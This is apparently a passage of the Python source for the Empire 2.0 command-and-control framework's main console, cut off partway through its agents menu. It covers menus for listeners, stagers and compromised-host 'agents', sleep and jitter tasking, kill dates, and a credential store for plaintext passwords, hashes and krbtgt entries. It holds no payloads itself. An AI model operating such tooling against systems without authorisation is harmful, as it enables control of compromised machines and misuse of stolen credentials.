"""

The main controller class for Empire.

This is what's launched from ./empire.
Contains the Main, Listener, Agents, Agent, and Module
menu loops.

"""

# make version for Empire
VERSION = "2.0"

from pydispatch import dispatcher

import sys
import cmd
import sqlite3
import os
import hashlib
import time
import fnmatch
import shlex

# Empire imports
import helpers
import messages
import agents
import listeners
import modules
import stagers
import credentials
from zlib_wrapper import compress
from zlib_wrapper import decompress


# custom exceptions used for nested menu navigation
class NavMain(Exception):
    """
    Custom exception class used to navigate to the 'main' menu.
    """
    pass


class NavAgents(Exception):
    """
    Custom exception class used to navigate to the 'agents' menu.
    """
    pass


class NavListeners(Exception):
    """
    Custom exception class used to navigate to the 'listeners' menu.
    """
    pass


class MainMenu(cmd.Cmd):
    """
    The main class used by Empire to drive the 'main' menu
    displayed when Empire starts.
    """
    def __init__(self, args=None):

        cmd.Cmd.__init__(self)

        # globalOptions[optionName] = (value, required, description)
        self.globalOptions = {}

        # empty database object
        self.conn = self.database_connect()
        time.sleep(1)

        # pull out some common configuration information
        (self.isroot, self.installPath, self.ipWhiteList, self.ipBlackList) = helpers.get_config('rootuser, install_path,ip_whitelist,ip_blacklist')

        # change the default prompt for the user
        self.prompt = '(Empire) > '
        self.do_help.__func__.__doc__ = '''Displays the help menu.'''
        self.doc_header = 'Commands'

        dispatcher.connect(self.handle_event, sender=dispatcher.Any)

        # Main, Agents, or Listeners
        self.menu_state = 'Main'

        # parse/handle any passed command line arguments
        self.args = args
        self.handle_args()

        dispatcher.send('[*] Empire starting up...', sender="Empire")

        # instantiate the agents, listeners, and stagers objects
        self.agents = agents.Agents(self, args=args)
        self.credentials = credentials.Credentials(self, args=args)
        self.stagers = stagers.Stagers(self, args=args)
        self.modules = modules.Modules(self, args=args)
        self.listeners = listeners.Listeners(self, args=args)

        # print the loading menu
        messages.loading()


    def check_root(self):
        """
        Check if Empire has been run as root, and alert user.
        """
        try:

            if os.geteuid() != 0:
                if self.isroot:
                    messages.title(VERSION)
                    print "[!] Warning: Running Empire as non-root, after running as root will likely fail to access prior agents!"
                    while True:
                        a = raw_input(helpers.color("[>] Are you sure you want to continue (y) or (n): "))
                        if a.startswith("y"):
                            return
                        if a.startswith("n"):
                            self.shutdown()
                            sys.exit()
                else:
                    pass
            if os.geteuid() == 0:
                if self.isroot:
                    pass
                if not self.isroot:
                    cur = self.conn.cursor()
                    cur.execute("UPDATE config SET rootuser = 1")
                    cur.close()
        except Exception as e:
            print e


    def handle_args(self):
        """
        Handle any passed arguments.
        """

        if self.args.listener or self.args.stager:
            # if we're displaying listeners/stagers or generating a stager
            if self.args.listener:
                if self.args.listener == 'list':
                    messages.display_active_listeners(self.listeners.activeListeners)
                else:
                    activeListeners = self.listeners.activeListeners
                    targetListener = [l for l in activeListeners if self.args.listener in l[1]]

                    if targetListener:
                        targetListener = targetListener[0]
                        # messages.display_listener_database(targetListener)
                        # TODO: reimplement this logic
                    else:
                        print helpers.color("\n[!] No active listeners with name '%s'\n" % (self.args.listener))

            else:
                if self.args.stager == 'list':
                    print "\nStagers:\n"
                    print "  Name             Description"
                    print "  ----             -----------"
                    for stagerName, stager in self.stagers.stagers.iteritems():
                        print "  %s%s" % ('{0: <17}'.format(stagerName), stager.info['Description'])
                    print "\n"
                else:
                    stagerName = self.args.stager
                    try:
                        targetStager = self.stagers.stagers[stagerName]
                        menu = StagerMenu(self, stagerName)

                        if self.args.stager_options:
                            for option in self.args.stager_options:
                                if '=' not in option:
                                    print helpers.color("\n[!] Invalid option: '%s'" % (option))
                                    print helpers.color("[!] Please use Option=Value format\n")
                                    if self.conn:
                                        self.conn.close()
                                    sys.exit()

                                # split the passed stager options by = and set the appropriate option
                                optionName, optionValue = option.split('=')
                                menu.do_set("%s %s" % (optionName, optionValue))

                            # generate the stager
                            menu.do_generate('')

                        else:
                            messages.display_stager(targetStager)

                    except Exception as e:
                        print e
                        print helpers.color("\n[!] No current stager with name '%s'\n" % (stagerName))

            # shutdown the database connection object
            if self.conn:
                self.conn.close()

            sys.exit()


    def shutdown(self):
        """
        Perform any shutdown actions.
        """

        print "\n" + helpers.color("[!] Shutting down...")
        dispatcher.send("[*] Empire shutting down...", sender="Empire")

        # enumerate all active servers/listeners and shut them down
        self.listeners.shutdown_listener('all')

        # shutdown the database connection object
        if self.conn:
            self.conn.close()


    def database_connect(self):
        """
        Connect to the default database at ./data/empire.db.
        """
        try:
            # set the database connectiont to autocommit w/ isolation level
            self.conn = sqlite3.connect('./data/empire.db', check_same_thread=False)
            self.conn.text_factory = str
            self.conn.isolation_level = None
            return self.conn

        except Exception:
            print helpers.color("[!] Could not connect to database")
            print helpers.color("[!] Please run database_setup.py")
            sys.exit()


    # def preloop(self):
    #     traceback.print_stack()


    def cmdloop(self):
        """
        The main cmdloop logic that handles navigation to other menus.
        """
        while True:
            try:
                if self.menu_state == 'Agents':
                    self.do_agents('')
                elif self.menu_state == 'Listeners':
                    self.do_listeners('')
                else:
                    # display the main title
                    messages.title(VERSION)

                    # get active listeners, agents, and loaded modules
                    num_agents = self.agents.get_agents_db()
                    if num_agents:
                        num_agents = len(num_agents)
                    else:
                        num_agents = 0

                    num_modules = self.modules.modules
                    if num_modules:
                        num_modules = len(num_modules)
                    else:
                        num_modules = 0

                    num_listeners = self.listeners.activeListeners
                    if num_listeners:
                        num_listeners = len(num_listeners)
                    else:
                        num_listeners = 0

                    print "       " + helpers.color(str(num_modules), "green") + " modules currently loaded\n"
                    print "       " + helpers.color(str(num_listeners), "green") + " listeners currently active\n"
                    print "       " + helpers.color(str(num_agents), "green") + " agents currently active\n\n"

                    cmd.Cmd.cmdloop(self)


            # handle those pesky ctrl+c's
            except KeyboardInterrupt as e:
                self.menu_state = "Main"
                try:
                    choice = raw_input(helpers.color("\n[>] Exit? [y/N] ", "red"))
                    if choice.lower() != "" and choice.lower()[0] == "y":
                        self.shutdown()
                        return True
                    else:
                        continue
                except KeyboardInterrupt as e:
                    continue

            # exception used to signal jumping to "Main" menu
            except NavMain as e:
                self.menu_state = "Main"

            # exception used to signal jumping to "Agents" menu
            except NavAgents as e:
                self.menu_state = "Agents"

            # exception used to signal jumping to "Listeners" menu
            except NavListeners as e:
                self.menu_state = "Listeners"

            except Exception as e:
                print helpers.color("[!] Exception: %s" % (e))
                time.sleep(5)


    def print_topics(self, header, commands, cmdlen, maxcol):
        """
        Print a nicely formatted help menu.
        Adapted from recon-ng
        """
        if commands:
            self.stdout.write("%s\n" % str(header))
            if self.ruler:
                self.stdout.write("%s\n" % str(self.ruler * len(header)))
            for command in commands:
                self.stdout.write("%s %s\n" % (command.ljust(17), getattr(self, 'do_' + command).__doc__))
            self.stdout.write("\n")


    def emptyline(self):
        """
        If any empty line is entered, do nothing.
        """
        pass


    def handle_event(self, signal, sender):
        """
        Default event handler.

        Signal Senders:
            Empire          -   the main Empire controller (this file)
            Agents          -   the Agents handler
            Listeners       -   the Listeners handler
            HttpHandler     -   the HTTP handler
            EmpireServer    -   the Empire HTTP server
        """

        # if --debug X is passed, log out all dispatcher signals
        if self.args.debug:

            debug_file = open('empire.debug', 'a')
            debug_file.write("%s %s : %s\n" % (helpers.get_datetime(), sender, signal))
            debug_file.close()

            if self.args.debug == '2':
                # if --debug 2, also print the output to the screen
                print " %s : %s" % (sender, signal)

        # display specific signals from the agents.
        if sender == "Agents":
            if "[+] Initial agent" in signal:
                print helpers.color(signal)

            if ("[+] Listener for" in signal) and ("updated to" in signal):
                print helpers.color(signal)

            elif "[!] Agent" in signal and "exiting" in signal:
                print helpers.color(signal)

            elif "WARNING" in signal or "attempted overwrite" in signal:
                print helpers.color(signal)

            elif "on the blacklist" in signal:
                print helpers.color(signal)

        elif sender == "EmpireServer":
            if "[!] Error starting listener" in signal:
                print helpers.color(signal)

        elif sender == "Listeners":
            print helpers.color(signal)


    ###################################################
    # CMD methods
    ###################################################

    def default(self, line):
        "Default handler."
        pass


    def do_exit(self, line):
        "Exit Empire"
        raise KeyboardInterrupt


    def do_agents(self, line):
        "Jump to the Agents menu."
        try:
            agents_menu = AgentsMenu(self)
            agents_menu.cmdloop()
        except Exception as e:
            raise e


    def do_listeners(self, line):
        "Interact with active listeners."
        try:
            listener_menu = ListenersMenu(self)
            listener_menu.cmdloop()
        except Exception as e:
            raise e


    def do_usestager(self, line):
        "Use an Empire stager."

        try:
            parts = line.split(' ')

            if parts[0] not in self.stagers.stagers:
                print helpers.color("[!] Error: invalid stager module")

            elif len(parts) == 1:
                stager_menu = StagerMenu(self, parts[0])
                stager_menu.cmdloop()
            elif len(parts) == 2:
                listener = parts[1]
                if not self.listeners.is_listener_valid(listener):
                    print helpers.color("[!] Please enter a valid listener name or ID")
                else:
                    self.stagers.set_stager_option('Listener', listener)
                    stager_menu = StagerMenu(self, parts[0])
                    stager_menu.cmdloop()
            else:
                print helpers.color("[!] Error in MainMenu's do_userstager()")

        except Exception as e:
            raise e


    def do_usemodule(self, line):
        "Use an Empire module."
        if line not in self.modules.modules:
            print helpers.color("[!] Error: invalid module")
        else:
            try:
                module_menu = ModuleMenu(self, line)
                module_menu.cmdloop()
            except Exception as e:
                raise e


    def do_searchmodule(self, line):
        "Search Empire module names/descriptions."
        self.modules.search_modules(line.strip())


    def do_creds(self, line):
        "Add/display credentials to/from the database."

        filterTerm = line.strip()

        if filterTerm == "":
            creds = self.credentials.get_credentials()

        elif shlex.split(filterTerm)[0].lower() == "add":

            # add format: "domain username password <notes> <credType> <sid>
            args = shlex.split(filterTerm)[1:]

            if len(args) == 3:
                domain, username, password = args
                if helpers.validate_ntlm(password):
                    # credtype, domain, username, password, host, sid="", notes=""):
                    self.credentials.add_credential("hash", domain, username, password, "")
                else:
                    self.credentials.add_credential("plaintext", domain, username, password, "")

            elif len(args) == 4:
                domain, username, password, notes = args
                if helpers.validate_ntlm(password):
                    self.credentials.add_credential("hash", domain, username, password, "", notes=notes)
                else:
                    self.credentials.add_credential("plaintext", domain, username, password, "", notes=notes)

            elif len(args) == 5:
                domain, username, password, notes, credType = args
                self.credentials.add_credential(credType, domain, username, password, "", notes=notes)

            elif len(args) == 6:
                domain, username, password, notes, credType, sid = args
                self.credentials.add_credential(credType, domain, username, password, "", sid=sid, notes=notes)

            else:
                print helpers.color("[!] Format is 'add domain username password <notes> <credType> <sid>")
                return

            creds = self.credentials.get_credentials()

        elif shlex.split(filterTerm)[0].lower() == "remove":

            try:
                args = shlex.split(filterTerm)[1:]
                if len(args) != 1:
                    print helpers.color("[!] Format is 'remove <credID>/<credID-credID>/all'")
                else:
                    if args[0].lower() == "all":
                        choice = raw_input(helpers.color("[>] Remove all credentials from the database? [y/N] ", "red"))
                        if choice.lower() != "" and choice.lower()[0] == "y":
                            self.credentials.remove_all_credentials()
                    else:
                        if "," in args[0]:
                            credIDs = args[0].split(",")
                            self.credentials.remove_credentials(credIDs)
                        elif "-" in args[0]:
                            parts = args[0].split("-")
                            credIDs = [x for x in xrange(int(parts[0]), int(parts[1]) + 1)]
                            self.credentials.remove_credentials(credIDs)
                        else:
                            self.credentials.remove_credentials(args)

            except Exception:
                print helpers.color("[!] Error in remove command parsing.")
                print helpers.color("[!] Format is 'remove <credID>/<credID-credID>/all'")

            return


        elif shlex.split(filterTerm)[0].lower() == "export":
            args = shlex.split(filterTerm)[1:]

            if len(args) != 1:
                print helpers.color("[!] Please supply an output filename/filepath.")
                return
            else:
                self.credentials.export_credentials(args[0])
                return

        elif shlex.split(filterTerm)[0].lower() == "plaintext":
            creds = self.credentials.get_credentials(credtype="plaintext")

        elif shlex.split(filterTerm)[0].lower() == "hash":
            creds = self.credentials.get_credentials(credtype="hash")

        elif shlex.split(filterTerm)[0].lower() == "krbtgt":
            creds = self.credentials.get_krbtgt()

        else:
            creds = self.credentials.get_credentials(filterTerm=filterTerm)

        messages.display_credentials(creds)


    def do_set(self, line):
        "Set a global option (e.g. IP whitelists)."

        parts = line.split(' ')
        if len(parts) == 1:
            print helpers.color("[!] Please enter 'IP,IP-IP,IP/CIDR' or a file path.")
        else:
            if parts[0].lower() == "ip_whitelist":
                if parts[1] != "" and os.path.exists(parts[1]):
                    try:
                        open_file = open(parts[1], 'r')
                        ipData = open_file.read()
                        open_file.close()
                        self.agents.ipWhiteList = helpers.generate_ip_list(ipData)
                    except Exception:
                        print helpers.color("[!] Error opening ip file %s" % (parts[1]))
                else:
                    self.agents.ipWhiteList = helpers.generate_ip_list(",".join(parts[1:]))
            elif parts[0].lower() == "ip_blacklist":
                if parts[1] != "" and os.path.exists(parts[1]):
                    try:
                        open_file = open(parts[1], 'r')
                        ipData = open_file.read()
                        open_file.close()
                        self.agents.ipBlackList = helpers.generate_ip_list(ipData)
                    except Exception:
                        print helpers.color("[!] Error opening ip file %s" % (parts[1]))
                else:
                    self.agents.ipBlackList = helpers.generate_ip_list(",".join(parts[1:]))
            else:
                print helpers.color("[!] Please choose 'ip_whitelist' or 'ip_blacklist'")


    def do_reset(self, line):
        "Reset a global option (e.g. IP whitelists)."

        if line.strip().lower() == "ip_whitelist":
            self.agents.ipWhiteList = None
        if line.strip().lower() == "ip_blacklist":
            self.agents.ipBlackList = None


    def do_show(self, line):
        "Show a global option (e.g. IP whitelists)."

        if line.strip().lower() == "ip_whitelist":
            print self.agents.ipWhiteList
        if line.strip().lower() == "ip_blacklist":
            print self.agents.ipBlackList


    def do_load(self, line):
        "Loads Empire modules from a non-standard folder."

        if line.strip() == '' or not os.path.isdir(line.strip()):
            print helpers.color("[!] Please specify a valid folder to load modules from.")
        else:
            self.modules.load_modules(rootPath=line.strip())


    def do_reload(self, line):
        "Reload one (or all) Empire modules."

        if line.strip().lower() == "all":
            # reload all modules
            print "\n" + helpers.color("[*] Reloading all modules.") + "\n"
            self.modules.load_modules()
        elif os.path.isdir(line.strip()):
            # if we're loading an external directory
            self.modules.load_modules(rootPath=line.strip())
        else:
            if line.strip() not in self.modules.modules:
                print helpers.color("[!] Error: invalid module")
            else:
                print "\n" + helpers.color("[*] Reloading module: " + line) + "\n"
                self.modules.reload_module(line)


    def do_list(self, line):
        "Lists active agents or listeners."

        parts = line.split(' ')

        if parts[0].lower() == 'agents':

            line = ' '.join(parts[1:])
            allAgents = self.agents.get_agents_db()

            if line.strip().lower() == 'stale':

                agentsToDisplay = []

                for agent in allAgents:

                    # max check in -> delay + delay*jitter
                    intervalMax = (agent['delay'] + agent['delay'] * agent['jitter']) + 30

                    # get the agent last check in time
                    agentTime = time.mktime(time.strptime(agent['lastseen_time'], "%Y-%m-%d %H:%M:%S"))
                    if agentTime < time.mktime(time.localtime()) - intervalMax:
                        # if the last checkin time exceeds the limit, remove it
                        agentsToDisplay.append(agent)

                messages.display_agents(agentsToDisplay)


            elif line.strip() != '':
                # if we're listing an agents active in the last X minutes
                try:
                    minutes = int(line.strip())

                    # grab just the agents active within the specified window (in minutes)
                    agentsToDisplay = []
                    for agent in allAgents:
                        agentTime = time.mktime(time.strptime(agent['lastseen_time'], "%Y-%m-%d %H:%M:%S"))

                        if agentTime > time.mktime(time.localtime()) - (int(minutes) * 60):
                            agentsToDisplay.append(agent)

                    messages.display_agents(agentsToDisplay)

                except Exception:
                    print helpers.color("[!] Please enter the minute window for agent checkin.")

            else:
                messages.display_agents(allAgents)


        elif parts[0].lower() == 'listeners':
            messages.display_active_listeners(self.listeners.activeListeners)


    def do_interact(self, line):
        "Interact with a particular agent."

        name = line.strip()

        sessionID = self.agents.get_agent_id_db(name)

        if sessionID and sessionID != '' and sessionID in self.agents.agents:
            AgentMenu(self, sessionID)
        else:
            print helpers.color("[!] Please enter a valid agent name")


    def complete_usemodule(self, text, line, begidx, endidx, language=None):
        "Tab-complete an Empire module path."

        module_names = self.modules.modules.keys()
        if language:
            module_names = [ (module_name[len(language)+1:]) for module_name in module_names if module_name.startswith(language)]

        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in module_names if s.startswith(mline)]


    def complete_reload(self, text, line, begidx, endidx):
        "Tab-complete an Empire PowerShell module path."

        module_names = self.modules.modules.keys() + ["all"]

        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in module_names if s.startswith(mline)]


    def complete_usestager(self, text, line, begidx, endidx):
        "Tab-complete an Empire stager module path."

        stagerNames = self.stagers.stagers.keys()

        if line.split(' ')[1].lower() in stagerNames:
            listenerNames = self.listeners.get_listener_names()
            endLine = ' '.join(line.split(' ')[1:])
            mline = endLine.partition(' ')[2]
            offs = len(mline) - len(text)
            return [s[offs:] for s in listenerNames if s.startswith(mline)]
        else:
            # otherwise tab-complate the stager names
            mline = line.partition(' ')[2]
            offs = len(mline) - len(text)
            return [s[offs:] for s in stagerNames if s.startswith(mline)]

    def complete_setlist(self, text, line, begidx, endidx):
        "Tab-complete a global list option"

        options = ["listeners", "agents"]

        if line.split(' ')[1].lower() in options:
            return helpers.complete_path(text, line, arg=True)

        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in options if s.startswith(mline)]

    def complete_set(self, text, line, begidx, endidx):
        "Tab-complete a global option."

        options = ["ip_whitelist", "ip_blacklist"]

        if line.split(' ')[1].lower() in options:
            return helpers.complete_path(text, line, arg=True)

        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in options if s.startswith(mline)]


    def complete_load(self, text, line, begidx, endidx):
        "Tab-complete a module load path."
        return helpers.complete_path(text, line)


    def complete_reset(self, text, line, begidx, endidx):
        "Tab-complete a global option."

        return self.complete_set(text, line, begidx, endidx)


    def complete_show(self, text, line, begidx, endidx):
        "Tab-complete a global option."

        return self.complete_set(text, line, begidx, endidx)


    def complete_creds(self, text, line, begidx, endidx):
        "Tab-complete 'creds' commands."

        commands = ["add", "remove", "export", "hash", "plaintext", "krbtgt"]

        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in commands if s.startswith(mline)]

    def complete_interact(self, text, line, begidx, endidx):
        "Tab-complete an interact command"

        names = self.agents.get_agent_names_db()

        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in names if s.startswith(mline)]

    def complete_list(self, text, line, begidx, endidx):
        "Tab-complete list"

        return self.complete_setlist(text, line, begidx, endidx)


class AgentsMenu(cmd.Cmd):
    """
    The main class used by Empire to drive the 'agents' menu.
    """
    def __init__(self, mainMenu):
        cmd.Cmd.__init__(self)

        self.mainMenu = mainMenu

        self.doc_header = 'Commands'

        # set the prompt text
        self.prompt = '(Empire: ' + helpers.color("agents", color="blue") + ') > '

        messages.display_agents(self.mainMenu.agents.get_agents_db())

    # def preloop(self):
    #     traceback.print_stack()

    # print a nicely formatted help menu
    #   stolen/adapted from recon-ng
    def print_topics(self, header, commands, cmdlen, maxcol):
        if commands:
            self.stdout.write("%s\n" % str(header))
            if self.ruler:
                self.stdout.write("%s\n" % str(self.ruler * len(header)))
            for command in commands:
                self.stdout.write("%s %s\n" % (command.ljust(17), getattr(self, 'do_' + command).__doc__))
            self.stdout.write("\n")


    def emptyline(self):
        pass


    def do_back(self, line):
        "Go back to the main menu."
        raise NavMain()


    def do_listeners(self, line):
        "Jump to the listeners menu."
        raise NavListeners()


    def do_main(self, line):
        "Go back to the main menu."
        raise NavMain()


    def do_exit(self, line):
        "Exit Empire."
        raise KeyboardInterrupt


    def do_list(self, line):
        "Lists all active agents (or listeners)."

        if line.lower().startswith("listeners"):
            self.mainMenu.do_list("listeners " + str(' '.join(line.split(' ')[1:])))
        elif line.lower().startswith("agents"):
            self.mainMenu.do_list("agents " + str(' '.join(line.split(' ')[1:])))
        else:
            self.mainMenu.do_list("agents " + str(line))


    def do_rename(self, line):
        "Rename a particular agent."

        parts = line.strip().split(' ')

        # name sure we get an old name and new name for the agent
        if len(parts) == 2:
            # replace the old name with the new name
            self.mainMenu.agents.rename_agent(parts[0], parts[1])
        else:
            print helpers.color("[!] Please enter an agent name and new name")


    def do_interact(self, line):
        "Interact with a particular agent."

        name = line.strip()

        sessionID = self.mainMenu.agents.get_agent_id_db(name)

        if sessionID and sessionID != '' and sessionID in self.mainMenu.agents.agents:
            AgentMenu(self.mainMenu, sessionID)
        else:
            print helpers.color("[!] Please enter a valid agent name")


    def do_kill(self, line):
        "Task one or more agents to exit."

        name = line.strip()

        if name.lower() == 'all':
            try:
                choice = raw_input(helpers.color('[>] Kill all agents? [y/N] ', 'red'))
                if choice.lower() != '' and choice.lower()[0] == 'y':
                    allAgents = self.mainMenu.agents.get_agents_db()
                    for agent in allAgents:
                        sessionID = agent['session_id']
                        self.mainMenu.agents.add_agent_task_db(sessionID, 'TASK_EXIT')
            except KeyboardInterrupt:
                print ''

        else:
            try:
                choice = raw_input(helpers.color("[>] Kill agent '%s'? [y/N] " % (name), 'red'))

                # extract the sessionID and clear the agent tasking
                sessionID = self.mainMenu.agents.get_agent_id_db(name)

                if sessionID and len(sessionID) != 0:
                    self.mainMenu.agents.add_agent_task_db(sessionID, 'TASK_EXIT')
                else:
                    print helpers.color("[!] Invalid agent name")
            except KeyboardInterrupt:
                print ''


    def do_creds(self, line):
        "Display/return credentials from the database."
        self.mainMenu.do_creds(line)


    def do_clear(self, line):
        "Clear one or more agent's taskings."

        name = line.strip()

        if name.lower() == 'all':
            self.mainMenu.agents.clear_agent_tasks_db('all')
        elif name.lower() == 'autorun':
            self.mainMenu.agents.clear_autoruns_db()
        else:
            # extract the sessionID and clear the agent tasking
            sessionID = self.mainMenu.agents.get_agent_id_db(name)

            if sessionID and len(sessionID) != 0:
                self.mainMenu.agents.clear_agent_tasks_db(sessionID)
            else:
                print helpers.color("[!] Invalid agent name")


    def do_sleep(self, line):
        "Task one or more agents to 'sleep [agent/all] interval [jitter]'"

        parts = line.strip().split(' ')

        if len(parts) == 1:
            print helpers.color("[!] Please enter 'interval [jitter]'")

        elif parts[0].lower() == 'all':
            delay = parts[1]
            jitter = 0.0
            if len(parts) == 3:
                jitter = parts[2]

            allAgents = self.mainMenu.agents.get_agents_db()

            for agent in allAgents:
                sessionID = agent['session_id']
                # update this agent info in the database
                self.mainMenu.agents.set_agent_field_db('delay', delay, sessionID)
                self.mainMenu.agents.set_agent_field_db('jitter', jitter, sessionID)
                # task the agent
                self.mainMenu.agents.add_agent_task_db(sessionID, 'TASK_SHELL', 'Set-Delay ' + str(delay) + ' ' + str(jitter))
                # update the agent log
                msg = "Tasked agent to delay sleep/jitter %s/%s" % (delay, jitter)
                self.mainMenu.agents.save_agent_log(sessionID, msg)

        else:
            # extract the sessionID and clear the agent tasking
            sessionID = self.mainMenu.agents.get_agent_id_db(parts[0])

            delay = parts[1]
            jitter = 0.0
            if len(parts) == 3:
                jitter = parts[2]

            if sessionID and len(sessionID) != 0:
                # update this agent's information in the database
                self.mainMenu.agents.set_agent_field_db('delay', delay, sessionID)
                self.mainMenu.agents.set_agent_field_db('jitter', jitter, sessionID)

                self.mainMenu.agents.add_agent_task_db(sessionID, 'TASK_SHELL', 'Set-Delay ' + str(delay) + ' ' + str(jitter))
                # update the agent log
                msg = "Tasked agent to delay sleep/jitter %s/%s" % (delay, jitter)
                self.mainMenu.agents.save_agent_log(sessionID, msg)

            else:
                print helpers.color("[!] Invalid agent name")


    def do_lostlimit(self, line):
        "Task one or more agents to 'lostlimit [agent/all] [number of missed callbacks] '"

        parts = line.strip().split(' ')

        if len(parts) == 1:
            print helpers.color("[!] Usage: 'lostlimit [agent/all] [number of missed callbacks]")

        elif parts[0].lower() == 'all':
            lostLimit = parts[1]
            allAgents = self.mainMenu.agents.get_agents_db()

            for agent in allAgents:
                sessionID = agent['session_id']
                # update this agent info in the database
                self.mainMenu.agents.set_agent_field_db('lost_limit', lostLimit, sessionID)
                # task the agent
                self.mainMenu.agents.add_agent_task_db(sessionID, 'TASK_SHELL', 'Set-LostLimit ' + str(lostLimit))
                # update the agent log
                msg = "Tasked agent to change lost limit %s" % (lostLimit)
                self.mainMenu.agents.save_agent_log(sessionID, msg)

        else:
            # extract the sessionID and clear the agent tasking
            sessionID = self.mainMenu.agents.get_agent_id_db(parts[0])
            lostLimit = parts[1]

            if sessionID and len(sessionID) != 0:
                # update this agent's information in the database
                self.mainMenu.agents.set_agent_field_db('lost_limit', lostLimit, sessionID)

                self.mainMenu.agents.add_agent_task_db(sessionID, 'TASK_SHELL', 'Set-LostLimit ' + str(lostLimit))
                # update the agent log
                msg = "Tasked agent to change lost limit %s" % (lostLimit)
                self.mainMenu.agents.save_agent_log(sessionID, msg)

            else:
                print helpers.color("[!] Invalid agent name")


    def do_killdate(self, line):
        "Set the killdate for one or more agents (killdate [agent/all] 01/01/2016)."

        parts = line.strip().split(' ')

        if len(parts) == 1:
            print helpers.color("[!] Usage: 'killdate [agent/all] [01/01/2016]'")

        elif parts[0].lower() == 'all':
            date = parts[1]

            allAgents = self.mainMenu.agents.get_agents_db()

            for agent in allAgents:
                sessionID = agent['session_id']
                # update this agent's field in the database
                self.mainMenu.agents.set_agent_field_db('kill_date', date, sessionID)
                # task the agent
                self.mainMenu.agents.add_agent_task_db(sessionID, 'TASK_SHELL', "Set-KillDate " + str(date))
                msg = "Tasked agent to set killdate to " + str(date)
                self.mainMenu.agents.save_agent_log(sessionID, msg)

        else:
            # extract the sessionID and clear the agent tasking
            sessionID = self.mainMenu.agents.get_agent_id_db(parts[0])
            date = parts[1]

            if sessionID and len(sessionID) != 0:
                # update this agent's field in the database
                self.mainMenu.agents.set_agent_field_db('kill_date', date, sessionID)
                # task the agent
                self.mainMenu.agents.add_agent_task_db(sessionID, 'TASK_SHELL', "Set-KillDate " + str(date))
                # update the agent log
                msg = "Tasked agent to set killdate to " + str(date)
                self.mainMenu.agents.save_agent_log(sessionID, msg)

            else:
                print helpers.color("[!] Invalid agent name")


    def do_workinghours(self, line):
        "Set the workinghours for one or more agents (workinghours [agent/all] 9:00-17:00)."

        parts = line.strip().split(' ')

        if len(parts) == 1:
            print helpers.color("[!] Usage: 'workinghours [agent/all] [9:00-17:00]'")

        elif parts[0].lower() == 'all':
            hours = parts[1]
            hours = hours.replace(',', '-')

            allAgents = self.mainMenu.agents.get_agents_db()

            for agent in allAgents:
                sessionID = agent['session_id']
                # update this agent's field in the database
                self.mainMenu.agents.set_agent_field_db('working_hours', hours, sessionID)
                # task the agent
                self.mainMenu.agents.add_agent_task_db(sessionID, 'TASK_SHELL', "Set-WorkingHours " + str(hours))
                msg = "Tasked agent to set working hours to %s" % (hours)
                self.mainMenu.agents.save_agent_log(sessionID, msg)

        else:
            # extract the sessionID and clear the agent tasking
            sessionID = self.mainMenu.agents.get_agent_id_db(parts[0])

            hours = parts[1]
            hours = hours.replace(",", "-")

            if sessionID and len(sessionID) != 0:
                # update this agent's field in the database
                self.mainMenu.agents.set_agent_field_db('working_hours', hours, sessionID)
                # task the agent
                self.mainMenu.agents.add_agent_task_db(sessionID, 'TASK_SHELL', "Set-WorkingHours " + str(hours))

                # update the agent log
                msg = "Tasked agent to set working hours to %s" % (hours)
                self.mainMenu.agents.save_agent_log(sessionID, msg)

            else:
                print helpers.color("[!] Invalid agent name")


    def do_remove(self, line):
        "Remove one or more agents from the database."

        name = line.strip()

        if name.lower() == 'all':
            try:
                choice = raw_input(helpers.color('[>] Remove all agents from the database? [y/N] ', 'red'))
                if choice.lower() != '' and choice.lower()[0] == 'y':
                    self.mainMenu.agents.remove_agent_db('%')
            except KeyboardInterrupt:
                print ''

        elif name.lower() == 'stale':
            # remove 'stale' agents that have missed their checkin intervals

            allAgents = self.mainMenu.agents.get_agents_db()

            for agent in allAgents:

                sessionID = agent['session_id']

                # max check in -> delay + delay*jitter
                intervalMax = (agent['delay'] + agent['delay'] * agent['jitter']) + 30

                # get the agent last check in time
                agentTime = time.mktime(time.strptime(agent['lastseen_time'], "%Y-%m-%d %H:%M:%S"))

                if agentTime < time.mktime(time.localtime()) - intervalMax:
                    # if the last checkin time exceeds the limit, remove it
                    self.mainMenu.agents.remove_agent_db(sessionID)


        elif name.isdigit():
            # if we're removing agents that checked in longer than X minutes ago
            allAgents = self.mainMenu.agents.get_agents_db()

            try:
                minutes = int(line.strip())

                # grab just the agents active within the specified window (in minutes)
                for agent in allAgents:

                    sessionID = agent['session_id']

                    # get the agent last check in time
                    agentTime = time.mktime(time.strptime(agent['lastseen_time'], "%Y-%m-%d %H:%M:%S"))

                    if agentTime < time.mktime(time.localtime()) - (int(minutes) * 60):
                        # if the last checkin time exceeds the limit, remove it
                        self.mainMenu.agents.remove_agent_db(sessionID)

            except:
                print helpers.color("[!] Please enter the minute window for agent checkin.")

        else:
            # extract the sessionID and clear the agent tasking
            sessionID = self.mainMenu.agents.get_agent_id_db(name)

            if sessionID and len(sessionID) != 0:
                self.mainMenu.agents.remove_agent_db(sessionID)
            else:
                print helpers.color("[!] Invalid agent name")


    def do_usestager(self, line):
        "Use an Empire stager."

        parts = line.split(' ')

        if parts[0] not in self.mainMenu.stagers.stagers:
            print helpers.color("[!] Error: invalid stager module")

        elif len(parts) == 1:
            stager_menu = StagerMenu(self.mainMenu, parts[0])
            stager_menu.cmdloop()
        elif len(parts) == 2:
            listener = parts[1]
            if not self.mainMenu.listeners.is_listener_valid(listener):
                print helpers.color("[!] Please enter a valid listener name or ID")
            else:
                self.mainMenu.stagers.set_stager_option('Listener', listener)
                stager_menu = StagerMenu(self.mainMenu, parts[0])
                stager_menu.cmdloop()
        else:
            print helpers.color("[!] Error in AgentsMenu's do_userstager()")


    def do_usemodule(self, line):
        "Use an Empire PowerShell module."

        module = line.strip()

        if module not in self.mainMenu.modules.modules:
            print helpers.color("[!] Error: invalid module")
        else:
            # set agent to "all"
            module_menu = ModuleMenu(self.mainMenu, line, agent="all")
            module_menu.cmdloop()


    def do_searchmodule(self, line):
        "Search Empire module names/descriptions."

        searchTerm = line.strip()

